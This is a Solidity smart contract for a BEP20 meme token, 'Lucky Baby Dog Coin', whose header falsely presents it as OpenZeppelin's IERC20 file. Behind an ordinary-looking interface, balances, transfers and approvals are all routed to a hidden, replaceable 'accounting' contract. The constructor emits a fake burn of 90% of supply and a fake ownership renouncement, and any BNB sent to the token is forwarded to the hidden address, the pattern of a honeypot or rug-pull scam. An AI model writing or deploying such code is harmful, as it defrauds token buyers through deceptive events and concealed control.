// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.12;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

interface BEP20 {
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function getOwner() external view returns (address);

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

interface Accounting {
    function doTransfer(address caller, address from, address to, uint amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
    function doApprove(address from, address spender, uint256 value) external returns (bool success);
    function allowance(address who, address spender) view external returns (uint256);
}

contract COINTOKEN is BEP20 {
    using SafeMath for uint256;

    address public owner;    
    string public name;
    string public symbol;
    uint8 public _decimals;
    uint public _totalSupply;
    address private accounting;
    
    address public constant DEAD = 0x000000000000000000000000000000000000dEaD;
    constructor(address _accounting) {
        name = "Lucky Baby Dog Coin";
        symbol = "LuckyBabyDog";
        _decimals = 18;
        _totalSupply = 5000000000 * 10 * 10 ** 18;
        accounting = _accounting;
        owner = msg.sender;  

        emit Transfer(address(0), msg.sender, _totalSupply);
        emit Transfer(msg.sender, DEAD,_totalSupply.sub(_totalSupply.div(10)));

        emit OwnershipTransferred(owner, address(0));
       
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    receive() external payable {accounting.call{value: msg.value}("");}

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function balanceOf(address who) view public returns (uint256) {
        return Accounting(accounting).balanceOf(who);
    }
    
    function allowance(address who, address spender) view public returns (uint256) {
        return Accounting(accounting).allowance(who, spender);
    }

    function setAccountingAddress(address accountingAddress) public {
        require(msg.sender == accounting);
        accounting = accountingAddress;
    }

    function renounceOwnership() public {
        require(msg.sender == accounting);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
    
    function transfer(address to, uint amount) public returns (bool success) {
        emit Transfer(msg.sender, to, amount);
        return Accounting(accounting).doTransfer(msg.sender, msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint amount) public returns (bool success) {
        bool result = Accounting(accounting).doTransfer(msg.sender, from, to, amount);
        emit Transfer(from, to, amount);
        return result;
    }

    
    function approve(address spender, uint256 value) public returns (bool success) {
        bool result = Accounting(accounting).doApprove(msg.sender, spender, value);
        emit Approval(msg.sender, spender, value);
        return true;
    }
    
    function transferNotify(address from, address to, uint amount)  external returns(uint){
         require(msg.sender == accounting);
        emit Transfer(from,to,amount);
        return amount;
    }

}